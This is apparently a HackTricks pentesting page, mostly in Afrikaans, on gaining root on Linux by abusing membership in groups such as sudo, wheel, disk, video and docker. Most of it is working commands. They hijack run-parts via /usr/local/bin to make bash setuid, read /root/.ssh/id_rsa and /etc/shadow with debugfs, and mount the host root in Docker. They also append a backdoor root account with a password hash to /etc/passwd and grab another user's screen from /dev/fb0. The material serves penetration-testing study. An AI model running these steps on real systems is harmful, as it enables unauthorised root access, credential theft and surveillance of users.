# Interessante Groepe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groepe

### **PE - Metode 1**

**Soms**, **per standaard (of omdat sommige sagteware dit benodig)** binne die **/etc/sudoers** lêer kan jy sommige van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep sudo of admin behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```
sudo su
```
### PE - Metode 2

Vind alle suid binêre en kyk of daar die binêre **Pkexec** is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binêre **pkexec 'n SUID-binary** is en jy behoort tot **sudo** of **admin**, kan jy waarskynlik binêre uitvoer as sudo met behulp van `pkexec`.\
Dit is omdat dit tipies die groepe is binne die **polkit-beleid**. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **per standaard** verskyn die groepe **sudo** en **admin** in sommige Linux-distribusies.

Om **root te word kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekonnekteer is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Groep

**Soms**, **per standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep wheel behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, om **root te word kan jy net uitvoer**:
```
sudo su
```
## Shadow Group

Users from the **group shadow** can **read** the **/etc/shadow** file:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **sommige hashes te kraak**.

## Personeel Groep

**personeel**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) te maak sonder om root regte te benodig (let daarop dat uitvoerbare lêers in `/usr/local/bin` in die PATH veranderlike van enige gebruiker is, en hulle kan die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian verspreidings, wys die `$PATH` veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ons sommige programme in `/usr/local` kan oorneem, kan ons maklik root verkry.

Om die `run-parts` program oor te neem is 'n maklike manier om root te verkry, omdat die meeste programme 'n `run-parts` soos (crontab, wanneer ssh aanmeld) sal uitvoer.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
of Wanneer 'n nuwe ssh-sessie aanmeld.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Eksploiteer**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Hierdie voorreg is byna **gelyk aan worteltoegang** aangesien jy toegang tot al die data binne die masjien kan verkry.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.

## Video Group

Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies ingelog is** op 'n terminal op die masjien.

Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms observeer. Om dit te doen, moet jy die **huidige beeld op die skerm** in rou data gryp en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm op `/sys/class/graphics/fb0/virtual_size` vind.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **rauwe beeld** te **open**, kan jy **GIMP** gebruik, kies die **`screen.raw`** lêer en kies as lêertipe **Raw image data**:

![](<../../../images/image (463).png>)

Verander dan die Breedte en Hoogte na diegene wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter vertoon):

![](<../../../images/image (317).png>)

## Root Groep

Dit lyk of **lede van die root groep** standaard toegang kan hê om sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog, te **wysig**...

**Kontroleer watter lêers root lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Groep

Jy kan **die wortel lêerstelsel van die gasheer masjien aan 'n instansie se volume monteer**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Uiteindelik, as jy nie van enige van die voorstelle hou nie, of hulle werk om een of ander rede nie (docker api firewall?) kan jy altyd probeer om **'n bevoorregte houer te loop en daaruit te ontsnap** soos hier verduidelik:

{{#ref}}
../docker-security/
{{#endref}}

As jy skryfrechten oor die docker socket het, lees [**hierdie pos oor hoe om voorregte te verhoog deur die docker socket te misbruik**](../index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Groep

{{#ref}}
./
{{#endref}}

## Adm Groep

Gewoonlik het **lede** van die groep **`adm`** toestemming om **log** lêers te **lees** wat geleë is in _/var/log/_.\
Daarom, as jy 'n gebruiker binne hierdie groep gecompromitteer het, moet jy beslis **na die logs kyk**.

## Auth groep

Binne OpenBSD kan die **auth** groep gewoonlik in die vouers _**/etc/skey**_ en _**/var/db/yubikey**_ skryf as hulle gebruik word.\
Hierdie toestemmings kan misbruik word met die volgende exploit om **voorregte** na root te verhoog: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
